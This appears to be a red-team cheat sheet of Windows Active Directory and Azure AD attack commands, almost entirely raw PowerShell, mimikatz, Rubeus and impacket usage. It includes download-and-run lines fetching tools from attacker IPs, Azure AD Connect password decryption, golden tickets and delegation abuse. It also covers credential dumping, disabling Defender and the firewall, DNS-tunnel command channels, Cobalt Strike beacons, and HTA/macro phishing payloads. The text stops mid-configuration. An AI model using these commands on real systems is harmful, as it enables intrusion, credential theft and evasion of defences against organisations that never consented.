# red
red team tips and trix

ad enum
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/hound.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/jaws.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/up.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/sql.txt')
```
```
invoke-mapdomaintrust | select sourcename,targetname,trustdirection
```
aad enum
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/ad.txt')
get-ADUser -LDAPFilter "(samAccountName=MSOL_*)" -properties name,description | select name,description | fl
```
```
C:\program files\microsoft azure ad sync\data
ADSync.mdf
ADSync_log.LDF
mv.dsml
```
aad exploit - ADSyncDecrypt [sauce](https://github.com/dirkjanm/adconnectdump/tree/master)
```
# NOTE: SYSTEM context
# c#
upload SharpDPAPI.exe
.\SharpDPAPI.exe machinetriage
# powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.34/dpapi.txt')
invoke-sharpdpapi machinemasterkeys
```
```
# if dpapi fails, use mimi
 .\m.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```
```
# force start ADSync - use native AAD tools
PS C:\Program Files\Microsoft Azure AD Sync\uishell> set-service -name adsync -startuptype automatic
PS C:\Program Files\Microsoft Azure AD Sync\uishell> set-service -name adsync -status running -passthru
PS C:\Program Files\Microsoft Azure AD Sync\Bin> Get-ADSyncDatabaseConfiguration
PS C:\Program Files\Microsoft Azure AD Sync\Bin> Get-ADSyncConnector
```
```
# place ADDecryptSync in AAD\Bin directory
iwr -uri http://10.10.14.44/mcrypt.dll -outfile .\mcrypt.dll
iwr -uri http://10.10.14.44/ADSyncDecrypt.exe -outfile .\ADSyncDecrypt.exe
iwr -uri http://10.10.14.44/ADSyncGather.exe -outfile .\ADSyncGather.exe
iwr -uri http://10.10.14.44/ADSyncQuery.exe -outfile .\ADSyncQuery.exe
```
```
# do it - ADSyncDecrypt most direct, Gather+Query needs the ADSync.MDF and ADSync_log.LDF files 
PS C:\Program Files\Microsoft Azure AD Sync\Bin> .\ADSyncDecrypt.exe

<encrypted-attributes>
 <attribute name="password">HTML_ENCODED_PASSWORD</attribute>
</encrypted-attributes>
```
```
# html decode
https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=TmYjb0A3ZiVDR15wfTdmaEFYKmt1Ykg6PW5jOistVnIlQE9UZihEbGl9R1JNQFlZdC9hJXtfWEgld210SShaXXRlUWcrRTA6SncjdlU7KlshXlM3Ni0jQDpKfCQtfCZndDt4LUkpJFJkKk4mYW1wO1RrSXQrdkpuQWFJOyl0b1krSjJtPXk
```
```
# secretsdump
proxychains -q -f server.conf impacket-secretsdump -just-dc DOMAIN.LOCAL/MSOL_2a1d03e02d11:'HTML_DECODED_PASSWORD'@dc.DOMAIN.local
```
aad read adsync logs
```
# ADSync module should exist on the box that's using AAD
Import-Module ADSync
Get-EventLog -LogName Application -Newest 100 -Source ADSync
Get-EventLog -LogName Application -Newest 20 | ft -AutoSize -Wrap
```
ad abuse backup operator [sauce](https://security.stackexchange.com/questions/182540/how-could-users-in-backup-operators-group-escalate-its-privileges/182549) [sauce2](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf)
```
# first, login as the user with Backup Operator rights
# or, pth as the user from SYSTEM context using mimikatz or rubeus
.\m.exe "privilege::debug"
sekurlsa::pth /user:USERNAME /domain:DOMAIN.local /ntlm:NTLM /run:"cmd"
.\r.exe asktgt /domain:DOMAIN.local /user:USERNAME /rc4:NTLM /ptt
```
```
# locate sysvol
\\dc.DOMAIN.local\SYSVOL\DOMAIN.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
```
```
# copy out GptTmpl contents
[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\Curr.. etc
```
```
# get SID of target user - confirm with powerview:
iex(new-object net.webclient).downloadstring('http://10.10.14.44/view.txt')
convertfrom-sid SID
```
```
# edit GptTmpl.inf - NOTE THE EMPTY "=" SIGN
[Group Membership]
*S-1-5-21-997099906-443949041-4154884969-1116__Memberof = *S-1-5-32-544
*S-1-5-21-997099906-443949041-4154884969-1116__Members =
```
```
# wait ~10min, secretsdump the DC
proxychains -q -f server.conf impacket-secretsdump DOMAIN/USERNAME:'PASSWORD'@dc.domain.local
```
ad abuse schema admin [sauce](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#schema-admins) (IMPORTANT: use msad.dll to Set-ADObject properly) [msad.dll](https://github.com/samratashok/ADModule)
```
# make sure you're in Schema Admin context - either RDP in or use powershell -Credential $cred
iex(new-object net.webclient).downloadstring('http://10.10.14.34/ad.txt')
iex(new-object net.webclient).downloadstring('http://10.10.14.34/view.txt')
$username = 'DOMAIN.local\username'
$password = 'P@ssw0rd' | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
```
```
# get SID of user you wanna elevate
get-netuser USERTOELEVATE | select objectsid,samaccountname
```
```
# change schema - this allows USERTOELEVATE to edit GROUPS
upload msad.dll
import-module c:\windows\tasks\msad.dll
Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=DOMAIN,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SID_OF_USERTOELEVATE)';} -Verbose -Credential $cred -server dc.DOMAIN.local
```
```
# check if schema got changed - we want to see if our USERTOELEVATE's SID really got added to GROUP objects
# https://devblogs.microsoft.com/scripting/powershell-and-the-active-directory-schema-part-1/

$schemapath = (Get-ADRootDSE).SchemaNamingContext
$schemapath
Get-ADObject -SearchBase $schemapath -Properties * | where Name -like "group"

# MUST SEE THIS:
VERBOSE: Performing the operation "Set" on target "CN=Group,CN=Schema,CN=Configuration,DC=DOMAIN,DC=local".
```
```
# check for new groups
get-domaingroup | select samaccountname, whencreated | sort-object whencreated
```
```
# once new group got created, add USERTOELEVATE to the new group
Add-ADGroupMember NEW_GROUP -Members USERTOELEVATE -Server dc.DOMAIN.local
```
abuse force change password
```
$username = 'adminWebSvc'
$password = 'FGjksdff89sdfj' | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
```
```
$UserPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $cred -Verbose
```
abuse genericwrite - rbcd (Note: best way: RDP into source computer, enter SYSTEM context)
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
iex(new-object net.webclient).downloadstring('http://192.168.10.11/mad.txt')
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
```
```
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer
```
```
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
```
```
Get-DomainComputer -Identity JUMP09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
```
$RBCDbytes = Get-DomainComputer JUMP09 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
```
```
convertfrom-sid S-1-5-21-2032401531-514583578-4118054891-6101
OPS\myComputer$
```
```
c:\windows\tasks\or.exe hash /password:h4x
AA6EAFB522589934A6E5CE92C6438221
```
```
c:\windows\tasks\or.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.corpy.com /ptt
```
```
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
dir \\jump09.ops.corpy.com\C$
```
```
c:\windows\tasks\psexec.exe -accepteula \\jump09.ops.corpy.com cmd
```
abuse services
```
sc qc SNMPTRAP
sc config SNMPTRAP start= demand
sc config SNMPTRAP obj= "NT Authority\SYSTEM" password= ""
sc config SNMPTRAP binpath= "cmd.exe /c net user jack P@ssw0rd /add"
```
```
sc start snmptrap
```
```
sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators jack /add"
```
```
sc start snmptrap
```
```
net localgroup administrators
```
abuse writedacl
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
```
```
$SecPassword = ConvertTo-SecureString '4dfgdfFFF542' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TRICKY\sqlsvc', $SecPassword)
```
```
Add-DomainObjectAcl -PrincipalIdentity sqlsvc -TargetIdentity "MAILADMINS" -Rights All -Credential $Cred -Verbose
```
```
Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'willy' -Credential $Cred -Verbose
```
```
get-domainuser willy
Get-DomainGroupMember -Identity 'MAILADMINS'
```
adfsdump + adfspoof usage (best practice: run as SYSTEM), must be able to interact with domain
```
# check
Get-AdfsProperties
# sploit
ADFSDump.exe
# save Private Key as dkm-private-key.txt
# save Encrypted Signing Key as encrypted-signing-key.b64.txt
# 1. b64 decode signing key into a .bin
cat encrypted-signing-key.b64.txt | base64 -d > encrypted-signing-key.bin
# 2. manually use hex editor on dkm private key to form a .bin
cat dkm-private-key.txt | tr -d "-" | xxd -r -p > dkm-private-key.bin
```
adfspoof (make sure to fix time first!!)
```
sudo net time set -S dc.domain.local
python3 ADFSpoof.py -b /path/to/encrypted-signing-key.bin /path/to/dkm-private-key.bin -s ADFS_SERVER.DOMAIN.LOCAL saml2 --endpoint "https://SAMLENDPOINT.DOMAIN.LOCAL/SamlResponseServlet" --nameidformat 'urn:oasis:names:tc:SAML:2.0:nameid-format:transient' --nameid 'DOMAIN\USER_TO_SPOOF' --rpidentifier 'IDENTIFIER_FOR_SAMLENDPOINT_ME_XXX-XXX-etc' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"><AttributeValue>DOMAIN\USER_TO_SPOOF</AttributeValue></Attribute>'
```
```
take the output and use burp, paste into the SAMLResponse=[PASTE HERE] , usually POST /SamlResponseServlet to SAMLENDPOINT.DOMAIN.LOCAL
```
adidns enum (dnstool, check WINS)
```
proxychains -q -f server.conf python3 /opt/krbrelayx/dnstool.py -u 'domain\username' -p 'P@ssw0rd' --record '@' --action 'query' 'DC.DNS.IP.ADD'
# if no WINS, good
```
adidns abuse (Active Directory Integrated DNS ADIDNS) [sauce](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/) + usually with ntlmrelayx or responder
```
iex(new-object net.webclient).downloadstring('http://10.10.14.44/view.txt')
iex(new-object net.webclient).downloadstring('http://10.10.14.44/mad.txt')
iex(new-object net.webclient).downloadstring('http://10.10.14.44/dns.txt')
```
```
# enum
get-ADIDNSZone
get-ADIDNSPermission
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord <<-- checks if we can create wildcard
```
```
# sploit
proxychains -q -f servicedesk.conf impacket-ntlmrelayx -t smb://sccm.domain.local -smb2support
New-ADIDNSNode -Verbose -Node * -Data 10.10.14.44
Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data 10.10.14.44) -Verbose
# loop (for when something keeps cleaning our records)
while(1){& New-ADIDNSNode -Verbose -Node * -Data 10.10.14.44;Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data 10.10.14.44) -Verbose;start-sleep -seconds 5}
```
```
# check
Resolve-DnsName NameThatDoesntExist
```
adidns dump (needs valid creds)
```
proxychains -q -f server04.conf adidnsdump -u 'domain.local\guest' ldap://dc.domain.local -r
```
bloodhound with ldap (non-domain-joined) (either make sure dns can find domain fqdn or specify DC)
```
invoke-bloodhound -collectionmethod all -domain "final.com" -LDAPUser "jack" -LDAPPass "P@ssw0rd" -DomainController 10.10.10.10
```
check clr version
```
$psversiontable.clrversion
```
```
[system.environment]::version
```
chisel socks win
```
/opt/chisel/chisel server -p 8000 --reverse
```
```
bitsadmin /Transfer myJob http://192.168.10.11/chisel.exe c:\windows\tasks\chisel.exe
c:\windows\tasks\chisel.exe client 192.168.10.11:8000 R:8001:socks
```
```
vi chi.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001
```
```
proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
```
chisel socks lin
```
/opt/chisel/chisel server -p 8000 --reverse
```
```
wget http://192.168.10.11/chisel -O /tmp/chisel
chmod 777 /tmp/chisel
/tmp/chisel client 192.168.10.11:8000 R:8001:socks
```
```
vi web05.conf
strict chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 8001
```
```
export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
```
```
proxychains -q -f web05.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
```
crossc2
```
./genCrossC2.Linux 10.10.14.34 443 .cobaltstrike.beacon_keys ";;/opt/malleable-c2/jquery-c2.4.9.profile" Linux x64 hola.elf
```
constrained delegation
```
get-domaincomputer -trustedtoauth
```
```
* Username : WEB01$
         * Domain   : EVIL
         * NTLM     : 004686491797c2704948c687eb203845
```
```
# if no hash and only have plaintext password
c:\tools\Rubeus.exe hash /password:lab
```
```
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
```
```
c:\windows\tasks\or.exe asktgt /user:web01$ /domain:evil.com /rc4:004686491797c2704948c687eb203845
```
```
c:\windows\tasks\or.exe s4u /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt /ticket:<tix>
```
cmd run powershell as another user (provide password in prompt)
```
runas /netonly /user:final.com\jack powershell
```
cme spray hash (local auth)
```
proxychains -q -f web05.conf crackmapexec smb ips.txt -u administrator -H 8388d07604009d14cbb78f7d37b9e887 --local-auth
```
cme spray pwd
```
proxychains -q -f met.conf crackmapexec smb ips.txt -u 'willy' -p 'fdsfssdfDFG4'
```
dnscat2 dns tunneling [setup authoritative ns on namecheap](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md), [sauce](https://github.com/iagox86/dnscat2#usage), [binaries](https://downloads.skullsecurity.org/dnscat2/)
```
sudo ruby ./dnscat2.rb mydomain.com
sudo dnscat2-server mydomain.com
```
```
dnscat2-v0.07-client-win32.exe mydomain.com
```
dns tunneling setup on namecheap [sauce](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md)
```
1. go to "Advanced DNS"
2. add A record -> ns1 -> attacker ip
3. add A record -> ns2 -> attacker ip
4. add A record -> @ -> attacker ip
5. scroll down -> PERSONAL DNS SERVER -> Register Nameserver
6. click ADD NAMESERVER -> ns1 -> attacker ip
7. click ADD NAMESERVER -> ns2 -> attacker ip
8. check: Find Nameservers -> Custom Nameservers -> ns1.your.domain
9. check: Find Nameservers -> Custom Nameservers -> ns2.your.domain
10. wait ~ 30min
```
```
.\dnscat2c.exe --dns server=13.13.13.13,port=53
.\dnscat2c.exe your.domain
```
dns tunneling setup on godaddy [sauce](https://www.drchaos.com/post/dnscat2-dns-reverse-tunneling-thru-secure-networks)
```
1. go to "Manage DNS"
2. add A record -> ns -> attacker ip
3. add A record -> ns1 -> attacker ip
4. add A record -> ns2 -> attacker ip
5. add A record -> @ -> attacker ip
6. add NS record -> ns1 -> ns1.your.domain
7. add NS record -> ns2 -> ns2.your.domain
8. scroll up -> "..." menu -> Host Names
9. add -> ns1 -> attacker ip
10. add -> ns2 -> attacker ip
11. back to "DNS Management" -> scroll down -> Nameservers -> Using custom nameservers -> Change
12. click Enter my own nameservers (advanced)
13. add -> ns1.your.domain
14. add -> ns2.your.domain
15. click Save
16. wait ~ 30min
```
```
.\dnscat2c.exe --dns server=13.13.13.13,port=53
.\dnscat2c.exe your.domain
```
dnscat2 powershell [sauce](https://github.com/lukebaggett/dnscat2-powershell)
```
# Start a command session, and send DNS requests to 8.8.8.8 on port 53:
Start-Dnscat2 -Domain <dnscat2 server> -DNSServer 8.8.8.8
```
```
# Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd
```
```
# Start a console session. Only use CNAME, MX, and AAAA requests:
Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX","AAAA") -Console
```
```
# Do not encrypt the session. Encryption is enabled by default.
Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption
```
dnsenum usage
```
dnsenum target.domain.com --dnsserver 10.10.110.13
```
enable rdp
```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```
enable SeBackupPrivilege
```
iwr -uri http://10.10.14.44/SeBackupPrivilegeUtils.dll -outfile .\SeBackupPrivilegeUtils.dll
iwr -uri http://10.10.14.44/SeBackupPrivilegeCmdLets.dll -outfile .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
enum mssql
```
exec sp_linkedservers;
select name from sys.servers;
select * from sys.linked_logins;
```
escape constrained language -> rs + runspace
```
sudo rlwrap nc -lvnp 3389
```
```
python3 makers.py -l 192.168.10.11 -p 3389
```
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
```
extra sids - krbtgt way (ref lab 16)
```
iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
iwr -uri http://192.168.10.11/oRubeus.exe -outfile c:\windows\tasks\or.exe
iwr -uri http://192.168.10.11/psexec.exe -outfile c:\windows\tasks\psexec.exe
```
```
c:\windows\tasks\psexec.exe -accepteula -i -u "NT AUTHORITY\SYSTEM" cmd
```
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:h4x /domain:CURRENT_DOMAIN /sid:CURRENT_DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:TARGET_DOMAIN_SID-519 /ptt
```
```
dir \\rdc02.corpy.com\c$
```
gmsa enum (group managed service accounts) - use ad.txt
```
iex(new-object net.webclient).downloadstring('http://10.10.14.44/ad.txt')
Get-ADServiceAccount -filter * -prop * -server DOMAIN.local | Select Name,DNSHostName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInternal,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPassword,ServicePrincipalNames
```
gobuster
```
gobuster dir -u http://web01.evil.com/ -w /usr/share/wordlists/dirb/big.txt -b 403,404 -t 50 -k -x .htm,.html,.log,.sh,.shtml,.sql,.txt,.xml | tee gobuster.txt
```
golden tickets (note: start from being NT Authority/SYSTEM)
```
c:\windows\tasks\m.exe "kerberos::purge" "exit"
```
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:fakeuser /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
```
hashcat password list
```
hashcat --force list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles5.rule -r /usr/share/hashcat/rules/append_atsign.rule -r /usr/share/hashcat/rules/append_exclamation.rule --stdout | sort -u > list-uniq.txt
```
hashcat krb5tgs (13100) [hashcat hashes ref](https://hashcat.net/wiki/doku.php?id=example_hashes)
```
sudo hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```
hashcat ntlmv2 (5600)
```
sudo hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```
impacket-atexec
```
proxychains -q -f server.conf impacket-atexec SMALLBANK/serviceacc\$@dc.smallbank.local "powershell -e B64CMD" -hashes :2060951907129392809244825245de08
```
impacket-smbexec
```
proxychains -q -f server.conf impacket-smbexec SMALLBANK/serviceacc\$@dc.smallbank.local -hashes :2060951907129392809244825245de08
```
impacket-psexec - kerberos
```
export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
```
```
proxychains -q -f ssh.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -no-pass
```
impacket-psexec pth
```
proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes :2060951907129392809244825245de08
```
impacket-psexec pwd
```
proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
```
impacket-getuserspn
```
proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw0rd'
```
```
# get TGS
proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw0rd' -request
```
impacket-ntlmrelayx dump-gmsa
```
proxychains -q -f server.conf impacket-ntlmrelayx --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://primary.DOMAIN.local
```
impacket-secretsdump
```
proxychains -q -f met.conf impacket-secretsdump administrator@sccm.domain.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
```
impacket-wmiexec
```
proxychains -q -f server.conf impacket-wmiexec administrator@dc.DOMAIN.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
```
inveigh usage - DNS (inveigh DNS)
```
upload Inveigh462.exe
.\Inveigh462.exe -dnstypes A,SRV -dnshost *.DOMAIN.local
```
```
download Inveigh-Log.txt
download Inveigh-NTLMv2.txt
download Inveigh-NTLMv2Users.txt
```
```
sudo hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```
kerberos set time to dc (fix clock) (fix time)
```
sudo proxychains -q -f nextcloud.conf net time set -S dc.domain.local
```
killdef
```
start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden
```
```
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -name "DisableAntiSpyware" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -name "DisableRealtimeMonitoring" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -name "DpaDisabled" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection' -name "DisableRealtimeMonitoring" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender\Real-Time Protection' -name "DpaDisabled" -value 1
```
killfw
```
netsh advfirewall set allprofiles state off
```
killupdates
```
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "NoAutoUpdate" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "NoAutoRebootWithLoggedOnUsers" -value 1
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AutoInstallMinorUpdates" -value 0
Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AUOptions" -value 2
```
laps
```
iex(new-object net.webclient).downloadstring('http://10.10.14.44/laps.txt')
get-lapscomputers
```
laps alternative (if laps.txt isn't working) (switch domain if have to)
```
iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
```
```
Get-DomainComputer | Foreach-Object {$_ | Select name,ms-mcs-admpwd}
```
ldapsearch [great sauce, search `search_filter = `](https://github.com/yaap7/ldapsearch-ad/blob/master/ldapsearchad/ldapsearchad.py)
```
# basic info
proxychains -q -f server.conf ldapsearch -H ldap://dc.DOMAIN.local -x -b "" -s base \* +
```
```
# all accounts
proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' 'objectClass=account' | tee ldapsearch_accounts.txt
```
```
# all objects
proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local'
```
```
# specific account (e.g. ardis)
proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(cn=ardis)"
```
```
# CA authorities and templates
proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=DOMAIN,DC=local" certificateTemplates
```
```
# delegation
proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
```
# domain admins
proxychains -q -f server.conf ldapsearch -x -LLL -H ldap://dc.DOMAIN.local -D "dc\guest" -b "dc=DOMAIN,dc=local" '(memberOf=cn=Domain Admins,cn=Users,dc=DOMAIN,dc=local)' cn
```
```
# exchange servers
proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "cn=Configuration,dc=DOMAIN,dc=local" -x -D 'dc\guest' -o ldif-wrap=no "(objectCategory=msExchExchangeServer)" dn
```
```
# members of domain admins
proxychains -q -f server.conf ldapsearch -x -LLL -H ldap://dc.DOMAIN.local -D "dc\guest" -b "dc=DOMAIN,dc=local" '(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=DOMAIN,dc=local)' cn
```
```
# kerberoastable
proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
```
```
# AS-REP roastable
proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```
```
# laps
proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "dc=DOMAIN,dc=local" -x -D 'dc\guest' '(ms-Mcs-AdmPwdExpirationtime=*)' ms-Mcs-AdmPwd
```
```
# replication data
proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "CN=Administrator,CN=Users,DC=DOMAIN,dc=local" -x -D 'dc\guest' msDS-ReplAttributeMetaData 
```
ldapsearch.py info
```
proxychains -q -f server.conf python3 ./ldapsearch-ad.py -l dc.DOMAIN.local -t info
```
linux qol
```
python -c "import pty;pty.spawn('/bin/bash')"
```
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
makehta + makers + makerunspace + swaks
```
python3 makers.py -l 192.168.10.11 -p 443
```
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
```
```
python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'bitsadmin /Transfer Hatealfredchar http://192.168.10.11/file.txt c:\windows\tasks\Kansaslackdad.txt'
```
```
swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
```
```
python3 makehta.py -a 64 -l 192.168.10.11 -p 443 -t cmd -c 'cmd /c certutil -decode c:\windows\tasks\Kansaslackdad.txt c:\windows\tasks\Plasticsthicknessscale.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Plasticsthicknessscale.exe'
```
```
swaks --to willy@corpy.com --from fake@corpy.com --server mail01.corpy.com --port 25 --body @body.txt
```
makemacro
```
python3 makemacro.py -a 64 -l 192.168.10.11 -p 443 -f inject -t doc -d ps1 -r 1
```
makerunspace inject
```
python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b Inject
```
makewrap -> use -p 1433 to avoid clashing with basic.rc (-p 443)
```
python3 makewrap.py -a 64 -l 192.168.10.11 -p 1433
```
manageengine custom schedules RCE
```
general settings > custom schedules
# custom triggers
sudo tcpdump -i tun0 ip proto \\icmp
criteria: priority is High
action: cmd /c ping 10.10.14.44
```
modlishka usage
```
wget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64
chmod +x Modlishka-linux-amd64
./Modlishka-linux-amd64 -config ./modlishka.json
tail -f requests.log
```
```
# modliskha json
{
  "proxyDomain": "domain.com",
  "listeningAddress": "10.10.14.44",

  "target": "target.domain.com",
  "targetResources": "",
